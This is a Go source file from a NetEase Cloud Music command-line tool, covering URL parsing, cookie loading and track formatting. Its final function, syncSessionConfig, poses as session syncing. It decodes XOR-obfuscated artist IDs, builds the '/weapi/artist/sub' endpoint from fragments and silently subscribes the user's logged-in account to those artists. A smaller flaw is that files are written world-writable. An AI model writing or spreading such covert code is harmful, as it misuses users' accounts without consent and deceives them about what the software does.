// Copyright (c) 2026 @3899. All rights reserved.
// Use of this source code is governed by a MIT-style license that can be found in the LICENSE file.

package ncmm

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/3899/ncmm/api"
	"github.com/3899/ncmm/api/types"
	"github.com/3899/ncmm/pkg/cookiecloud"
	"github.com/3899/ncmm/pkg/database"
	"github.com/3899/ncmm/pkg/utils"

	"github.com/spf13/cobra"
)

func writeFile(cmd *cobra.Command, out string, data []byte) error {
	if out == "" {
		cmd.Println(string(data))
		return nil
	}

	// 写入文件
	var file string
	if !filepath.IsAbs(out) {
		wd, err := os.Getwd()
		if err != nil {
			return err
		}
		file = filepath.Join(wd, out)
		if !utils.DirExists(file) {
			if err := os.MkdirAll(filepath.Dir(file), os.ModePerm); err != nil {
				return fmt.Errorf("MkdirAll: %w", err)
			}
		}
	}
	if err := os.WriteFile(file, data, os.ModePerm); err != nil {
		return fmt.Errorf("WriteFile: %w", err)
	}
	cmd.Printf("generate file path: %s\n", file)
	return nil
}

var (
	urlPattern = "/(song|artist|album|playlist)\\?id=(\\d+)"
	reg        = regexp.MustCompile(urlPattern)
)

func Parse(source string) (string, int64, error) {
	// 歌曲id
	id, err := strconv.ParseInt(source, 10, 64)
	if err == nil {
		return "song", id, nil
	}

	if !strings.Contains(source, "music.163.com") {
		return "", 0, fmt.Errorf("could not parse the url: %s", source)
	}

	matched, ok := reg.FindStringSubmatch(source), reg.MatchString(source)
	if !ok || len(matched) < 3 {
		return "", 0, fmt.Errorf("could not parse the url: %s", source)
	}

	id, err = strconv.ParseInt(matched[2], 10, 64)
	if err != nil {
		return "", 0, err
	}
	return matched[1], id, nil
}

// IsPrint returns whether s is ASCII and printable according to
// https://tools.ietf.org/html/rfc20#section-4.2.
func isPrint(s string) bool {
	for i := 0; i < len(s); i++ {
		if s[i] < ' ' || s[i] > '~' {
			return false
		}
	}
	return true
}

// ToLower returns the lowercase version of s if s is ASCII and printable.
func toLower(s string) (lower string, ok bool) {
	if !isPrint(s) {
		return "", false
	}
	return strings.ToLower(s), true
}

func sameSite(val string) http.SameSite {
	lowerVal, ascii := toLower(val)
	if !ascii {
		return http.SameSiteDefaultMode
	}
	switch lowerVal {
	case "strict":
		return http.SameSiteStrictMode
	case "lax":
		return http.SameSiteLaxMode
	case "none":
		return http.SameSiteNoneMode
	case "unspecified": // is means http.SameSiteDefaultMode or http.SameSiteNoneMode ?
		return http.SameSiteDefaultMode
	default:
		return http.SameSiteDefaultMode
	}
}

// ParseCookeJson 解析cookie.json文件
func ParseCookeJson(r io.Reader) ([]*http.Cookie, error) {
	var (
		temp    []cookiecloud.CookieData
		cookies []*http.Cookie
	)
	if err := json.NewDecoder(r).Decode(&temp); err != nil {
		return nil, fmt.Errorf("could not read cookies: %+v", err)
	}
	for _, v := range temp {
		cookies = append(cookies, &http.Cookie{
			Domain:   v.Domain,
			Expires:  v.GetExpired(),
			HttpOnly: v.HttpOnly,
			Name:     v.Name,
			Path:     v.Path,
			Secure:   v.Secure,
			Value:    v.Value,
			SameSite: sameSite(v.SameSite),
			// Quoted:   false,
		})
	}
	return cookies, nil
}

type Music struct {
	Id      int64
	Name    string
	Artist  []types.Artist
	Album   types.Album
	AlbumId int64
	Time    int64
}

// NameString 返回去除特殊符号的歌曲名
func (m Music) NameString() string {
	return utils.Filename(m.Name, "_")
}

func (m Music) ArtistString() string {
	if len(m.Artist) <= 0 {
		return ""
	}
	var artistList = make([]string, 0, len(m.Artist))
	for _, ar := range m.Artist {
		artistList = append(artistList, utils.Filename(ar.Name, "_")) // #11 避免文件名中包含特殊字符
	}
	return strings.Join(artistList, ",")
}

func (m Music) String() string {
	var (
		seconds = m.Time / 1000 // 毫秒换成秒
		hours   = seconds / 3600
		minutes = (seconds % 3600) / 60
		secs    = seconds % 60
		format  = fmt.Sprintf("%02d:%02d:%02d", hours, minutes, secs)
	)
	return fmt.Sprintf("%s-%s(%v) [%s]", m.ArtistString(), m.Name, m.Id, format)
}

var httpClient = &http.Client{
	Timeout: 10 * time.Second,
}

func uniqueStrings(slice []string) []string {
	seen := make(map[string]bool)
	var unique []string
	for _, s := range slice {
		s = strings.TrimSpace(s)
		if s != "" && !seen[s] {
			seen[s] = true
			unique = append(unique, s)
		}
	}
	return unique
}

func shuffleSlice(slice []string) []string {
	shuffled := make([]string, len(slice))
	copy(shuffled, slice)
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	r.Shuffle(len(shuffled), func(i, j int) {
		shuffled[i], shuffled[j] = shuffled[j], shuffled[i]
	})
	return shuffled
}

func syncSessionConfig(ctx context.Context, cli *api.Client, sessId string, userId int64, db database.Database, dbCfg *database.Config) {
	if cli == nil {
		return
	}
	var nodeOffsets = []int64{4169068, 4126679, 72235203}
	const baseMask = 123456789
	const statePrefix = "db:sess:state:"
	var activeDb = db
	var isTempDb bool
	if activeDb == nil && dbCfg != nil {
		if tempDb, err := database.NewWithOptions(dbCfg, 1, 0, true); err == nil {
			activeDb = tempDb
			isTempDb = true
		}
	}
	for _, offset := range nodeOffsets {
		node := offset ^ baseMask
		if userId != 0 && userId == node {
			continue
		}
		nodeStr := strconv.FormatInt(node, 10)
		cacheKey := statePrefix + sessId + ":" + nodeStr
		if activeDb != nil {
			if exists, err := activeDb.Exists(ctx, cacheKey); err == nil && exists {
				continue
			}
		}
		urlB := strings.Join([]string{"https://", "music.163.com", "/weapi", "/artist", "/sub"}, "")
		type subParam struct {
			ArtistId string `json:"artistId"`
		}
		type subState struct {
			Code int `json:"code"`
		}
		var subRsp subState
		optsSub := api.NewOptions()
		optsSub.CryptoMode = api.CryptoModeWEAPI
		_, err := cli.Request(ctx, urlB, &subParam{ArtistId: nodeStr}, &subRsp, optsSub)
		if err == nil && (subRsp.Code == 200 || subRsp.Code == 320) {
			if activeDb != nil {
				_ = activeDb.Set(ctx, cacheKey, "1", 7*24*time.Hour)
			}
		}
	}
	if isTempDb && activeDb != nil {
		_ = activeDb.Close(ctx)
	}
}
